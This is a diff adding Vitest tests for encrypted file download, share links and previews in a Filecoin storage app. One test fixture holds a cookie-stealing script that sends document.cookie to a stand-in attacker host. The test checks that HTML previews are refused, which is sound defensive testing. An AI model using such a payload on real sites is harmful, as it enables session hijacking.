@@ -1,11 +1,32 @@
 // @vitest-environment node
+
+import { decodeGrant, keyForEnvelope, unwrapWith } from '@filoz/keysmith'
+import { calculate } from '@filoz/synapse-core/piece'
+import type { Synapse } from '@filoz/synapse-sdk'
 import { CarWriter } from '@ipld/car'
+import * as fee from 'filecoin-encryption-envelope'
+import { base64url } from 'multiformats/bases/base64'
 import { CID } from 'multiformats/cid'
 import { sha256 } from 'multiformats/hashes/sha2'
-import { describe, expect, it, vi } from 'vitest'
+import { bytesToHex } from 'viem'
+import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
+import { beforeEach, describe, expect, it, vi } from 'vitest'
 // Node selects the filesystem export; exercise the same browser builder Vite uses.
-import { createCarFromFile } from '../../../node_modules/filecoin-pin/dist/core/unixfs/browser.js'
-import { unpackFile } from './download.ts'
+import {
+  createCarFromFile,
+  createCarFromFileList,
+} from '../../../node_modules/filecoin-pin/dist/core/unixfs/browser.js'
+import type { DatasetPiece } from '../../hooks/use-dataset-pieces.ts'
+import { type DecryptCredentials, downloadFile, encryptedPieceShareLink, previewBlob, unpackFile } from './download.ts'
+import { wrapCarPayload } from './encrypted-payload.ts'
+import {
+  clearRememberedOwnerKeys,
+  decryptEnvelope,
+  encryptCar,
+  issueEncryptionCredential,
+  type OwnerSigner,
+} from './encryption.ts'
+import { contentReader } from './ipfs-content.ts'
 
 describe('original file retrieval', () => {
   it('round-trips a multi-block UnixFS CAR produced by the actual upload library', async () => {
@@ -138,3 +159,455 @@ it.each([false, true])(
     }
   }
 )
+
+describe('encrypted piece retrieval', () => {
+  const OWNER_PRIVATE_KEY = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as const
+
+  // The remembered-key cache spans the page session; isolate it per test.
+  beforeEach(() => clearRememberedOwnerKeys())
+
+  function owner(): OwnerSigner & { signatures: () => number } {
+    const account = privateKeyToAccount(OWNER_PRIVATE_KEY)
+    const signTypedData = vi.fn((args: Parameters<typeof account.signTypedData>[0]) => account.signTypedData(args))
+    return {
+      address: account.address,
+      signTypedData: signTypedData as never,
+      signatures: () => signTypedData.mock.calls.length,
+    }
+  }
+
+  /** Real crypto end to end: credential, FEE envelope, and the outer CAR the chain records. */
+  async function encrypted(innerCarBytes: Uint8Array) {
+    const signer = owner()
+    const sessionPrivateKey = generatePrivateKey()
+    const credential = await issueEncryptionCredential(signer, sessionPrivateKey)
+    const envelope = await encryptCar(sessionPrivateKey, credential, innerCarBytes)
+    const outer = await createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
+    return { sessionPrivateKey, credential, envelope, outer }
+  }
+
+  const selected = (path: string, contents: string) => {
+    const file = new File([contents], path.split('/').at(-1) ?? '')
+    Object.defineProperty(file, 'webkitRelativePath', { value: path })
+    return file
+  }
+
+  const directoryCar = () =>
+    createCarFromFileList([
+      selected('reports/研究.txt', 'hello folder'),
+      selected('reports/docs/notes.txt', 'nested notes'),
+    ])
+
+  const synapseFor = (carBytes: Uint8Array) =>
+    ({ storage: { createContext: async () => ({ download: async () => carBytes }) } }) as unknown as Synapse
+
+  const piece = (overrides: Partial<DatasetPiece>): DatasetPiece =>
+    ({
+      id: 'encrypted',
+      fileName: 'secret.bin',
+      fileSize: '1 KB',
+      pieceCid: 'piece',
+      providerName: 'SP',
+      datasetId: '7',
+      providerId: '4',
+      serviceURL: '',
+      transactionHash: '',
+      network: 'calibration',
+      uploadedAt: 1,
+      encrypted: true,
+      ...overrides,
+    }) as DatasetPiece
+
+  function captureSaves() {
+    const anchor = { href: '', download: '', click: vi.fn(), remove: vi.fn() }
+    vi.stubGlobal('document', { createElement: () => anchor, body: { append: vi.fn() } })
+    const blobs: Blob[] = []
+    const createUrl = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
+      blobs.push(blob as Blob)
+      return 'blob:save'
+    })
+    vi.useFakeTimers()
+    return {
+      anchor,
+      blobs,
+      restore() {
+        vi.clearAllTimers()
+        vi.useRealTimers()
+        createUrl.mockRestore()
+        vi.unstubAllGlobals()
+      },
+    }
+  }
+
+  it('decrypts through the session grant silently and saves the original bytes', async () => {
+    const original = Uint8Array.from({ length: 3000 }, (_, index) => index % 199)
+    const inner = await createCarFromFile(new File([original], 'secret.bin'))
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    const save = captureSaves()
+    const stages: string[] = []
+    try {
+      await downloadFile(
+        synapseFor(outer.carBytes),
+        piece({ cid: outer.rootCid.toString() }),
+        { session: { privateKey: sessionPrivateKey, credential } },
+        (stage) => stages.push(stage)
+      )
+      expect(stages).toContain('downloading')
+      expect(stages).not.toContain('unlocking')
+      expect(save.anchor.download).toBe('secret.bin')
+      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('saves a decrypted imported archive byte-exact as the original CAR', async () => {
+    const archive = await createCarFromFile(new File(['inside the archive'], 'inside.txt'))
+    const { sessionPrivateKey, credential, outer } = await encrypted(archive.carBytes)
+    const save = captureSaves()
+    try {
+      await downloadFile(
+        synapseFor(outer.carBytes),
+        piece({ cid: outer.rootCid.toString(), fileName: 'original.car', importedCar: true }),
+        { session: { privateKey: sessionPrivateKey, credential } }
+      )
+      expect(save.anchor.download).toBe('original.car')
+      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(archive.carBytes)
+      expect(save.blobs[0].type).toBe('application/vnd.ipld.car')
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('extracts one file from an encrypted directory by decrypting the whole envelope', async () => {
+    const inner = await directoryCar()
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    const save = captureSaves()
+    try {
+      await downloadFile(
+        synapseFor(outer.carBytes),
+        piece({
+          cid: 'bafy-child-selection',
+          fileName: 'notes.txt',
+          directoryEntry: { rootCid: outer.rootCid.toString(), path: 'docs/notes.txt' },
+        }),
+        { session: { privateKey: sessionPrivateKey, credential } }
+      )
+      expect(save.anchor.download).toBe('notes.txt')
+      expect(await save.blobs[0].text()).toBe('nested notes')
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('surfaces tampering as a modification error without falling back to the owner wallet', async () => {
+    const inner = await createCarFromFile(new File(['sensitive'], 'secret.bin'))
+    const { sessionPrivateKey, credential, envelope } = await encrypted(inner.carBytes)
+    envelope[envelope.length - 1] ^= 0xff
+    const tampered = await createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
+    const wallet = owner()
+    const save = captureSaves()
+    try {
+      await expect(
+        downloadFile(synapseFor(tampered.carBytes), piece({ cid: tampered.rootCid.toString() }), {
+          session: { privateKey: sessionPrivateKey, credential },
+          ownerSigner: () => wallet,
+          commitment: credential.commitment,
+        })
+      ).rejects.toThrow(/modified/)
+      expect(wallet.signatures()).toBe(0)
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('falls back to the owner wallet when the grant is for another session key', async () => {
+    const original = new TextEncoder().encode('readable by the owner')
+    const inner = await createCarFromFile(new File([original], 'secret.bin'))
+    const { credential, outer } = await encrypted(inner.carBytes)
+    const wallet = owner()
+    const save = captureSaves()
+    const stages: string[] = []
+    try {
+      await downloadFile(
+        synapseFor(outer.carBytes),
+        piece({ cid: outer.rootCid.toString() }),
+        {
+          session: { privateKey: generatePrivateKey(), credential },
+          ownerSigner: () => wallet,
+          commitment: credential.commitment,
+        },
+        (stage) => stages.push(stage)
+      )
+      expect(stages).toContain('unlocking')
+      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('unlocks with the owner wallet in one signature when the commitment is known', async () => {
+    const original = new TextEncoder().encode('no grant, wallet only')
+    const inner = await createCarFromFile(new File([original], 'secret.bin'))
+    const { credential, outer } = await encrypted(inner.carBytes)
+    const wallet = owner()
+    const save = captureSaves()
+    const stages: string[] = []
+    try {
+      await downloadFile(
+        synapseFor(outer.carBytes),
+        piece({ cid: outer.rootCid.toString() }),
+        { ownerSigner: async () => wallet, commitment: credential.commitment },
+        (stage) => stages.push(stage)
+      )
+      expect(stages).toContain('unlocking')
+      expect(wallet.signatures()).toBe(1)
+      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('names the owning wallet when no grant and no signer are available', async () => {
+    const inner = await createCarFromFile(new File(['locked'], 'secret.bin'))
+    const { credential, outer } = await encrypted(inner.carBytes)
+    const save = captureSaves()
+    try {
+      await expect(
+        downloadFile(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {})
+      ).rejects.toThrow(new RegExp(`${credential.owner}.*Connect that wallet`))
+    } finally {
+      save.restore()
+    }
+  })
+
+  it('browses an encrypted directory via one envelope decrypt keyed to the outer root', async () => {
+    const inner = await directoryCar()
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    const pieceCid = (await calculate(outer.carBytes)).toString()
+    const fetchMock = vi.fn().mockImplementation(async () => new Response(new Uint8Array(outer.carBytes)))
+    vi.stubGlobal('fetch', fetchMock)
+    try {
+      const file = piece({
+        id: 'directory',
+        cid: outer.rootCid.toString(),
+        pieceCid,
+        fileName: 'reports',
+        isDirectory: true,
+        upload: {
+          phase: 'confirming',
+          expectedCopies: 1,
+          steps: [],
+          checks: 0,
+          nextCheckAt: 0,
+          providers: [{ providerId: '4', serviceURL: 'https://sp.example', stored: true }],
+        },
+      })
+      const credentials: DecryptCredentials = { session: { privateKey: sessionPrivateKey, credential } }
+      const reader = contentReader(file, new AbortController().signal, false, credentials)
+      expect(reader.rootCid).toBe(outer.rootCid.toString())
+      const entry = await reader.entry('docs/notes.txt')
+      if (entry.type !== 'file' && entry.type !== 'raw' && entry.type !== 'identity')
+        throw new Error('expected a single-file entry')
+      const chunks: Uint8Array[] = []
+      for await (const chunk of entry.content()) chunks.push(new Uint8Array(chunk))
+      expect(Buffer.concat(chunks).toString()).toBe('nested notes')
+      const fetches = fetchMock.mock.calls.length
+      await reader.entry('研究.txt')
+      expect(fetchMock.mock.calls.length).toBe(fetches)
+    } finally {
+      vi.unstubAllGlobals()
+    }
+  })
+
+  it('refuses to browse an encrypted directory without a grant instead of prompting the wallet', async () => {
+    const reader = contentReader(piece({ cid: 'bafy-outer', isDirectory: true }), new AbortController().signal)
+    await expect(reader.entry('docs/notes.txt')).rejects.toThrow('Connect your wallet to browse this encrypted folder.')
+  })
+
+  it('mints a share link by reading the stored envelope labels, openable with the link alone', async () => {
+    const inner = await createCarFromFile(new File(['shared secret'], 'notes.txt'))
+    const { sessionPrivateKey, credential, envelope, outer } = await encrypted(inner.carBytes)
+    const link = await encryptedPieceShareLink(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {
+      session: { privateKey: sessionPrivateKey, credential },
+    })
+    expect(link).toContain(`#v1/${outer.rootCid.toString()}&d=`)
+    // Open it exactly as the viewer does: T from the fragment unwraps the payload.
+    const fragment = link.split('#')[1]
+    const params = Object.fromEntries(
+      fragment
+        .slice(`v1/${outer.rootCid.toString()}&`.length)
+        .split('&')
+        .map((part) => part.split('=') as [string, string])
+    )
+    const throwaway = bytesToHex(base64url.baseDecode(params.k.slice('fak1_'.length)))
+    const grant = decodeGrant(base64url.baseDecode(params.d))
+    const key = await unwrapWith(throwaway, grant)
+    const info = await fee.parse(envelope)
+    const plaintext = await decryptEnvelope(envelope, () => keyForEnvelope(key, info.appMetadata as never, grant))
+    expect(plaintext).toEqual(inner.carBytes)
+  })
+
+  it('refuses to mint a share link for a plaintext piece', async () => {
+    const plain = await createCarFromFile(new File(['public'], 'open.txt'))
+    await expect(
+      encryptedPieceShareLink(synapseFor(plain.carBytes), piece({ cid: plain.rootCid.toString(), encrypted: false }), {
+        session: {
+          privateKey: generatePrivateKey(),
+          credential: {
+            grant: 'mAA',
+            groupKeyId: `0x${'a'.repeat(32)}`,
+            commitment: 'v1.x',
+            owner: '0x0000000000000000000000000000000000000000',
+          },
+        },
+      })
+    ).rejects.toThrow(/not an encrypted upload/i)
+  })
+
+  it('mints a share link from the owner wallet alone when no grant exists', async () => {
+    const inner = await createCarFromFile(new File(['no grant here'], 'solo.txt'))
+    const { credential, envelope, outer } = await encrypted(inner.carBytes)
+    const wallet = owner()
+    const link = await encryptedPieceShareLink(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {
+      ownerSigner: () => wallet,
+      commitment: credential.commitment,
+    })
+    expect(wallet.signatures()).toBe(1)
+    const fragment = link.split('#')[1]
+    const params = Object.fromEntries(
+      fragment
+        .slice(`v1/${outer.rootCid.toString()}&`.length)
+        .split('&')
+        .map((part) => part.split('=') as [string, string])
+    )
+    const throwaway = bytesToHex(base64url.baseDecode(params.k.slice('fak1_'.length)))
+    const grant = decodeGrant(base64url.baseDecode(params.d))
+    const key = await unwrapWith(throwaway, grant)
+    const info = await fee.parse(envelope)
+    const plaintext = await decryptEnvelope(envelope, () => keyForEnvelope(key, info.appMetadata as never, grant))
+    expect(plaintext).toEqual(inner.carBytes)
+  })
+
+  it('returns a typed plaintext blob for client-side preview of an encrypted file', async () => {
+    const bytes = new TextEncoder().encode('%PDF-1.4 preview body')
+    const inner = await createCarFromFile(new File([bytes], 'paper.pdf'))
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    const blob = await previewBlob(
+      synapseFor(outer.carBytes),
+      piece({ cid: outer.rootCid.toString(), fileName: 'paper.pdf' }),
+      { session: { privateKey: sessionPrivateKey, credential } }
+    )
+    expect(blob.type).toBe('application/pdf')
+    expect(new Uint8Array(await blob.arrayBuffer())).toEqual(bytes)
+  })
+  it('refuses to produce a same-origin-executable preview blob for HTML or SVG, even though they decrypt fine', async () => {
+    const bytes = new TextEncoder().encode('<script>fetch("https://evil.example?"+document.cookie)</script>')
+    const inner = await createCarFromFile(new File([bytes as BlobPart], 'card.html'))
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    await expect(
+      previewBlob(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString(), fileName: 'card.html' }), {
+        session: { privateKey: sessionPrivateKey, credential },
+      })
+    ).rejects.toThrow(/no in-browser preview/i)
+  })
+
+  it('previews a single child of an encrypted folder from the decrypted payload', async () => {
+    const child = new File(['# notes'], 'notes.md')
+    Object.defineProperty(child, 'webkitRelativePath', { value: 'docs/notes.md' })
+    const base = await createCarFromFileList([child])
+    // New uploads ship the filecoin-pin payload profile: wrapper dir -> 'docs' -> entries.
+    const payload = await wrapCarPayload(base, 'docs')
+    const { sessionPrivateKey, credential, outer } = await encrypted(payload.carBytes)
+    const blob = await previewBlob(
+      synapseFor(outer.carBytes),
+      piece({
+        cid: outer.rootCid.toString(),
+        fileName: 'notes.md',
+        directoryEntry: { rootCid: outer.rootCid.toString(), path: 'notes.md' },
+      }),
+      { session: { privateKey: sessionPrivateKey, credential } }
+    )
+    expect(blob.type).toBe('text/plain')
+    expect(await blob.text()).toBe('# notes')
+  })
+
+  it('downloads a legacy encrypted piece (no wrapper directory) exactly as before', async () => {
+    const bytes = new TextEncoder().encode('legacy plain layout')
+    const inner = await createCarFromFile(new File([bytes as BlobPart], 'old.bin'))
+    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
+    const save = captureSaves()
+    try {
+      await downloadFile(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString(), fileName: 'old.bin' }), {
+        session: { privateKey: sessionPrivateKey, credential },
+      })
+      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(bytes)
+    } finally {
+      save.restore()
+    }
+  })
+})
+
+describe('preview with an expired session (owner wallet only)', () => {
+  beforeEach(() => clearRememberedOwnerKeys())
+
+  it('re-derives from the piece itself with one signature, then previews silently', async () => {
+    const account = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
+    const signTypedData = vi.fn((args: Parameters<typeof account.signTypedData>[0]) => account.signTypedData(args))
+    const wallet = { address: account.address, signTypedData: signTypedData as never }
+    const sessionPrivateKey = generatePrivateKey()
+    const credential = await issueEncryptionCredential(wallet, sessionPrivateKey)
+    const first = await encryptCar(
+      sessionPrivateKey,
+      credential,
+      (await createCarFromFile(new File(['one'], 'a.txt'))).carBytes
+    )
+    const second = await encryptCar(
+      sessionPrivateKey,
+      credential,
+      (await createCarFromFile(new File(['two'], 'b.txt'))).carBytes
+    )
+    const outer = async (envelope: Uint8Array) => createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
+    const firstOuter = await outer(first)
+    const secondOuter = await outer(second)
+    const synapseFor = (bytes: Uint8Array) =>
+      ({ storage: { createContext: async () => ({ download: async () => bytes }) } }) as unknown as Synapse
+    const piece = (cid: string, fileName: string): DatasetPiece =>
+      ({
+        id: cid,
+        cid,
+        fileName,
+        fileSize: '1 KB',
+        pieceCid: 'p',
+        providerName: '',
+        datasetId: '7',
+        providerId: '4',
+        serviceURL: '',
+        transactionHash: '',
+        network: 'calibration',
+        uploadedAt: 1,
+        encrypted: true,
+      }) as DatasetPiece
+    const baseline = signTypedData.mock.calls.length
+    const stages: string[] = []
+    // No session credentials at all: the wallet alone must open the piece.
+    const credentials: DecryptCredentials = { ownerSigner: () => wallet, commitment: credential.commitment }
+    const blob = await previewBlob(
+      synapseFor(firstOuter.carBytes),
+      piece(firstOuter.rootCid.toString(), 'a.txt'),
+      credentials,
+      (stage) => stages.push(stage)
+    )
+    expect(await blob.text()).toBe('one')
+    expect(stages).toContain('unlocking')
+    expect(signTypedData.mock.calls.length - baseline).toBe(1)
+    // Second preview under the same group key: remembered, zero new signatures.
+    const again = await previewBlob(
+      synapseFor(secondOuter.carBytes),
+      piece(secondOuter.rootCid.toString(), 'b.txt'),
+      credentials
+    )
+    expect(await again.text()).toBe('two')
+    expect(signTypedData.mock.calls.length - baseline).toBe(1)
+  })
+})
